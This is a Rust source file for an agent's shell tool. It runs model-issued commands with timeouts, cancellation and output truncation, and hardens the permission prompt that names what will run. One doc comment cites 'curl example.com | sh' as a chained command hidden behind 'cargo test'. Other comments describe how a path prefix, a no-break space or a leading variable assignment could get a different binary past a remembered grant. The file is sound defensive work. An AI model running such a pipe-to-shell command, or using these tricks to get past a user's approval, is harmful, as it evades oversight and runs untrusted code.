//! Running a shell command.
//!
//! The command runs in the workspace root through `sh -c`, so the model gets
//! pipes and redirection without this file growing a shell of its own. Nothing
//! here confines what runs: a shell can reach anything the user can, which is
//! why every call comes through the permission engine and why the question the
//! user is asked names the program.

use std::process::{Child, Command, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crucible_core::{Cancel, Grant, Sensitivity, Tool, ToolArgs, ToolError, ToolOutput, Workspace};

use crate::args::Args;

/// The name the model calls.
const NAME: &str = "bash";

/// How long a command may take when the call does not say, in seconds.
const SECONDS: usize = 120;

/// The longest a call may ask for, in seconds. A command that needs longer
/// than this wants a different tool, not a bigger number.
const CEILING: usize = 600;

/// How much output comes back. Past this the interesting part is the end —
/// the error, the summary line — so the middle is what goes.
const OUTPUT: usize = 30_000;

/// How often the command is checked on while it runs. Short enough that a
/// cancelled turn stops promptly, long enough to cost nothing.
const TICK: Duration = Duration::from_millis(20);

/// How long the readers get to reach the end of their pipes once the command
/// itself is over. Reading what is already buffered takes no time at all, so
/// this is only ever spent when something else is still holding a pipe open.
const SETTLE: Duration = Duration::from_millis(200);

/// The root `description` is the tool's own; everything below it describes the
/// arguments.
const SCHEMA: &str = r#"{
  "description": "Runs a shell command in the workspace root and returns its output and exit status.",
  "type": "object",
  "properties": {
    "command": {
      "type": "string",
      "description": "The command line to run, as a shell would read it."
    },
    "timeout": {
      "type": "integer",
      "minimum": 1,
      "description": "How many seconds to allow before stopping it. Defaults to 120, and cannot exceed 600."
    }
  },
  "required": ["command"]
}"#;

/// Runs shell commands in the workspace root.
#[derive(Debug)]
pub struct Bash {
    workspace: Workspace,
    cancel: Cancel,
}

impl Bash {
    /// Runs in `workspace`, and stops when `cancel` says to.
    #[must_use]
    pub fn new(workspace: Workspace, cancel: Cancel) -> Self {
        Self { workspace, cancel }
    }

    /// Waits for `child`, killing it if the deadline passes or the user stops
    /// the turn.
    ///
    /// The pipes are drained on their own threads. Waiting first and reading
    /// afterwards would deadlock the moment a command produced more output
    /// than a pipe buffer holds, which is most commands worth running.
    fn wait(&self, mut child: Child, allowed: Duration) -> Result<Finished, ToolError> {
        let out = Pipe::drain(child.stdout.take());
        let err = Pipe::drain(child.stderr.take());

        let deadline = Instant::now() + allowed;
        let mut expired = false;

        // A child is not one of this program's threads: nothing in it will
        // notice the flag, so the only way to stop it is to kill it.
        let status = loop {
            match child.try_wait() {
                Ok(Some(status)) => break Some(status),
                Ok(None) => {}
                Err(source) => return Err(io("could not wait for the command", source)),
            }

            if self.cancel.requested() {
                let _ = child.kill();
                let _ = child.wait();
                return Err(ToolError::Cancelled(NAME));
            }

            if Instant::now() >= deadline {
                let _ = child.kill();
                expired = true;
                break child.wait().ok();
            }

            thread::sleep(TICK);
        };

        let ended = settle(&out, &err);

        Ok(Finished {
            code: status.and_then(|status| status.code()),
            out: joined(out.take(), err.take()),
            arriving: !ended,
            expired,
        })
    }
}

impl Tool for Bash {
    fn name(&self) -> &'static str {
        NAME
    }

    fn schema(&self) -> &'static str {
        SCHEMA
    }

    fn sensitivity(&self, args: &ToolArgs) -> Sensitivity {
        let named = match Args::parse(NAME, args)
            .and_then(|args| args.text("command").map(str::to_owned))
        {
            Ok(command) => program(&command).to_owned(),
            // A call this malformed will be refused by `run`, but it still has
            // to be given a sensitivity first — and the safe answer to "what is
            // about to run" when the answer cannot be read is everything that
            // was sent, not the first word of it.
            Err(_) => args.as_str().to_owned(),
        };

        Sensitivity::SpawnsProcess {
            program: named.into(),
        }
    }

    fn run(&self, args: ToolArgs, _grant: Grant) -> Result<ToolOutput, ToolError> {
        let args = Args::parse(NAME, &args)?;
        let command = args.text("command")?;
        let seconds = args.count("timeout", SECONDS)?;

        if seconds > CEILING {
            return Ok(ToolOutput::failed(format!(
                "timeout must be {CEILING} seconds or less"
            )));
        }

        if self.cancel.requested() {
            return Err(ToolError::Cancelled(NAME));
        }

        let child = Command::new("sh")
            .arg("-c")
            .arg(command)
            .current_dir(self.workspace.root())
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|source| io("could not start a shell", source))?;

        // `count` already refused anything but a positive number, and the
        // ceiling above bounds it, so the fallback is unreachable arithmetic
        // rather than a decision.
        let allowed = Duration::from_secs(u64::try_from(seconds).unwrap_or(60));

        Ok(self.wait(child, allowed)?.report())
    }
}

/// What a command left behind.
struct Finished {
    /// `None` when a signal ended it, which is what a kill looks like.
    code: Option<i32>,
    out: String,
    /// Whether the readers were still short of the end of a pipe when the wait
    /// for them ran out, which makes `out` a prefix of the output.
    arriving: bool,
    expired: bool,
}

impl Finished {
    /// The result the model reads.
    ///
    /// A non-zero exit is a failed output rather than an error: a failing test
    /// run is exactly the thing the model asked for and needs to see.
    fn report(self) -> ToolOutput {
        let mut body = if self.out.is_empty() {
            String::from("(no output)")
        } else {
            self.out
        };

        // Said whatever the exit status was: the command can succeed and still
        // have more to print. Unsaid, the model reads a prefix as the whole and
        // concludes the command printed nothing else.
        if self.arriving {
            body.push_str(
                "\n\n[output was still arriving: something the command left running holds it open]",
            );
        }

        if self.expired {
            return ToolOutput::failed(format!("{body}\n\n[stopped: the command ran too long]"));
        }

        match self.code {
            Some(0) => ToolOutput::ok(body),
            Some(code) => ToolOutput::failed(format!("{body}\n\n[exit status {code}]")),
            None => ToolOutput::failed(format!("{body}\n\n[the command was killed]")),
        }
    }
}

/// One of a command's output pipes, being read on a thread of its own.
struct Pipe {
    /// Shared rather than returned, so what has arrived can be taken without
    /// waiting for the end that may never come.
    text: Arc<Mutex<Vec<u8>>>,
    reader: thread::JoinHandle<()>,
}

impl Pipe {
    /// Starts reading `pipe` on a thread.
    fn drain<R: std::io::Read + Send + 'static>(pipe: Option<R>) -> Self {
        let text = Arc::new(Mutex::new(Vec::new()));
        let into = Arc::clone(&text);

        let reader = thread::spawn(move || {
            let Some(mut pipe) = pipe else { return };
            let mut buffer = [0_u8; 8192];

            while let Ok(read) = pipe.read(&mut buffer) {
                let (Some(arrived), Ok(mut text)) = (buffer.get(..read), into.lock()) else {
                    return;
                };
                if arrived.is_empty() {
                    return;
                }
                text.extend_from_slice(arrived);
            }
        });

        Self { text, reader }
    }

    /// Whether the reader has reached the end of the pipe.
    fn ended(&self) -> bool {
        self.reader.is_finished()
    }

    /// What has arrived so far.
    ///
    /// This never joins the reader. A killed command can leave a grandchild
    /// holding the pipe open — a background server is the usual one — and
    /// waiting for the end would then wait for a process nothing will stop.
    fn take(&self) -> Vec<u8> {
        self.text
            .lock()
            .map(|text| text.clone())
            .unwrap_or_default()
    }
}

/// Gives the readers a moment to reach the end once the command is over, and
/// says whether they got there.
///
/// Almost always they are already there: the bytes were read as they arrived,
/// and the last of them land when the process ends. The wait is bounded because
/// the case where they are not there is the case that never resolves — and
/// `false` is how what was collected gets reported as the prefix it is.
fn settle(out: &Pipe, err: &Pipe) -> bool {
    let deadline = Instant::now() + SETTLE;

    while !(out.ended() && err.ended()) {
        if Instant::now() >= deadline {
            return false;
        }
        thread::sleep(TICK);
    }

    true
}

/// Both streams as the terminal would have shown them, cut to size.
///
/// They are concatenated rather than labelled because a command's diagnostics
/// belong next to the output they explain, and a model reading `cargo test`
/// needs the failure and the summary in one piece of text.
fn joined(mut out: Vec<u8>, mut err: Vec<u8>) -> String {
    out.append(&mut err);
    cut(&String::from_utf8_lossy(&out))
}

/// The head and the tail, when there is more than anything can use.
///
/// The middle goes because the two ends carry the meaning: what the command
/// started doing, and how it ended.
fn cut(text: &str) -> String {
    if text.len() <= OUTPUT {
        return text.trim_end().to_owned();
    }

    let half = OUTPUT / 2;
    let head = text.get(..boundary(text, half)).unwrap_or_default();
    let tail = text
        .get(boundary(text, text.len() - half)..)
        .unwrap_or_default();
    let dropped = text.len() - head.len() - tail.len();

    format!("{head}\n\n[{dropped} bytes of output cut from the middle]\n\n{tail}")
        .trim_end()
        .to_owned()
}

/// The nearest character boundary at or after `at`, so a cut never lands
/// inside a character.
fn boundary(text: &str, at: usize) -> usize {
    (at..=text.len())
        .find(|index| text.is_char_boundary(*index))
        .unwrap_or(text.len())
}

/// What is about to run, for the question the user is asked and for what a
/// session-wide allow remembers.
///
/// A command that chains, pipes or redirects is reported whole. Its first word
/// does not describe what it does, and remembering `cargo` from `cargo test`
/// would then also allow `cargo test; curl example.com | sh`.
///
/// The word is reported as the model wrote it, path and all. `cargo` and
/// `./cargo` are different programs, and a remembered grant that could not tell
/// them apart would run any file of that name the model had just written.
fn program(command: &str) -> &str {
    // The shell's separators, which are not Rust's: `char::is_whitespace`
    // follows Unicode and would treat a no-break space as one of these.
    const IFS: [char; 3] = [' ', '\t', '\n'];

    let command = command.trim_matches(IFS);

    if command.contains([';', '|', '&', '`', '\n', '(', '>', '<']) {
        return command;
    }

    // Any other whitespace stays inside the word as far as `sh` is concerned,
    // so the text before it is a prefix of what runs rather than the name of
    // it. `./build\u{a0}x` would otherwise be announced — and remembered by an
    // `always` — as `./build`, while a second binary is what executes.
    if command.contains(|c: char| c.is_whitespace() && !IFS.contains(&c)) {
        return command;
    }

    match command.split(IFS).find(|word| !word.is_empty()) {
        // A leading `VAR=value` decides which binary the word after it
        // resolves to, so that word on its own no longer says what will run.
        Some(word) if !word.contains('=') => word,
        _ => command,
    }
}

/// An operating-system failure, named for the model.
fn io(problem: &'static str, source: std::io::Error) -> ToolError {
    ToolError::Io {
        tool: NAME,
        problem: problem.into(),
        source,
    }
}

#[cfg(test)]
mod tests;
